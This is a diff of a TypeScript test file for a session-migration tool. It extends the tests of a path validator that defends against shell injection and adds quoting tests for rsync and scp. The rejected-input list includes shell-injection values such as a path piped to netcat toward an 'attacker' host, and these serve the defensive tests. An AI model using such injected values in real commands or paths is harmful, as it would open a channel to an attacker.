@@ -92,9 +92,12 @@ describe('cwdHash', () => {
 })
 
 describe('assertSafePath (shell-injection defense)', () => {
-  it('accepts typical macOS paths', () => {
+  it('accepts typical macOS paths including ones with spaces', () => {
     expect(() => assertSafePath('/Users/jack/code/remote-cc')).not.toThrow()
     expect(() => assertSafePath('/opt/app_v2/data-1.2')).not.toThrow()
+    // Common macOS convention: paths with spaces
+    expect(() => assertSafePath('/Users/alice/My Project')).not.toThrow()
+    expect(() => assertSafePath('/Users/bob/code/Some App')).not.toThrow()
   })
 
   it('rejects relative paths', () => {
@@ -112,11 +115,12 @@ describe('assertSafePath (shell-injection defense)', () => {
       '/tmp/p`pwd`',
       '/tmp/p$HOME',
       '/tmp/p\n',
-      '/tmp/p with space',
       '/tmp/p|nc attacker 4444',
       "/tmp/p'injected'",
       '/tmp/p"injected"',
       '/tmp/p(',
+      '/tmp/p*',
+      '/tmp/p?',
     ]
     for (const p of bad) {
       expect(() => assertSafePath(p)).toThrow(UnsafePathError)
@@ -255,13 +259,38 @@ describe('migrator.migrate()', () => {
     const mig = createMigrator({ cluster, spawnImpl, fetchImpl: fetchMock, ...base })
     const r = await mig.migrate({ fromMachineId: 'src', toMachineId: 'dst', sessionId: 's1' })
     expect(r.ok).toBe(true)
-    // rsync used correct src/dst hostnames (paths are shell-quoted)
+    // rsync used correct src/dst hostnames (local cwd is shell-quoted for spaces)
     expect(calls[0].bin).toBe('rsync')
     expect(calls[0].args.some((a) => a.includes("alpha-host:'/tmp/p/'"))).toBe(true)
     expect(calls[0].args.some((a) => a.includes("bravo-host:'/tmp/p/'"))).toBe(true)
-    // scp used the cwd hash path
+    // scp used the cwd hash path with tilde-expansion on the remote side
+    // (NOT single-quoted $HOME — that would suppress expansion and break copy)
     const expected = cwdHash('/tmp/p')
     expect(calls[2].args.some((a) => a.includes(expected))).toBe(true)
+    expect(calls[2].args.some((a) => a.includes('~/.claude/projects/'))).toBe(true)
+    // No single-quoted $HOME sneaking in anywhere (regression guard)
+    for (const c of calls) {
+      for (const arg of c.args) {
+        expect(arg).not.toContain("'$HOME")
+      }
+    }
+  })
+
+  it('paths with spaces survive rsync (locally shell-quoted)', async () => {
+    const cluster = makeCluster({
+      src: makeMachine({
+        machineId: 'src',
+        sessions: [{ id: 's1', shortId: 's100', project: 'my project', cwd: '/Users/alice/My Project', time: '2026-01-01', summary: '' }],
+      }),
+      dst: makeMachine({ machineId: 'dst' }),
+    })
+    const { spawnImpl, calls } = makeSpawnMock([{ code: 0 }, { code: 0 }, { code: 0 }])
+    const fetchMock = vi.fn().mockResolvedValue(makeFetchResp({ ok: true }))
+    const mig = createMigrator({ cluster, spawnImpl, fetchImpl: fetchMock, ...base })
+    const r = await mig.migrate({ fromMachineId: 'src', toMachineId: 'dst', sessionId: 's1' })
+    expect(r.ok).toBe(true)
+    // Space-containing path is single-quoted (one argument on the remote shell)
+    expect(calls[0].args.some((a) => a.includes("'/Users/alice/My Project/'"))).toBe(true)
   })
 
   it('scp failure aborts migration with specific error', async () => {
